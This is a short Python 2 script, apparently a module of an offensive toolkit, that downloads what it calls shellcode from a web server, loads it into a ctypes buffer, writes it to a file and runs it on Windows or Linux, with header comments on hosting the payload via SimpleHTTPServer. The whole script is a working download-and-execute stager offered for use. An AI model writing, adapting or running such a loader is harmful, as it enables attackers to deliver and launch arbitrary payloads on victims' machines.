############ *_* TO note *_* ################
# run: python -m SimpleHTTPServer ###########
# The the directory from which you run that #
# command become the web directory, so move #
# files to that dir.                        #
# To check: firefox http://127.0.0.1:8000   #
############################################# 
import urllib2
import base64
import ctypes
import os
import time

# retrieve the shellcode from our web server
url = "http://127.0.0.1:8000/f1"
bin = True
OsTargetpath = "test1"
start = True

def connected():
	
	return True

def run(**args):
	response=""
	while not connected(): 
		time.sleep(2)
	try:
		response = urllib2.urlopen(url)
	except urllib2.HTTPError:
		os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
	except urllib2.URLError: 
		os.system("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
	#finally:
		#print response
	# decode the shellcode from base64
	shellcode = response.read()  ##shellcode = base64.b64decode(response.read())
	#print shellcode
	shellcode_buffer = ctypes.create_string_buffer((shellcode), len(shellcode))
	shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
	print(shellcode_buffer.value)
	#shellcode_func()
	fuun(shellcode)

def fuun(shellcode):	
	if bin:
		mon_fichier = open(OsTargetpath, "wb")
	else:
		mon_fichier = open(OsTargetpath, "w")
	mon_fichier.write(shellcode)
	mon_fichier.close()
	if start and os.name == 'nt':
		os.system("start {}".format(OsTargetpath))
	elif start and os.name == 'posix':
		os.system("chmod 777 {}".format(OsTargetpath))
		os.system("./{}".format(OsTargetpath))
	else:
		os.system("echo 'Non-recognized OS' >> Tapalog.log")
	time.sleep(5)
	#os.system("del fichier.exe")

run()
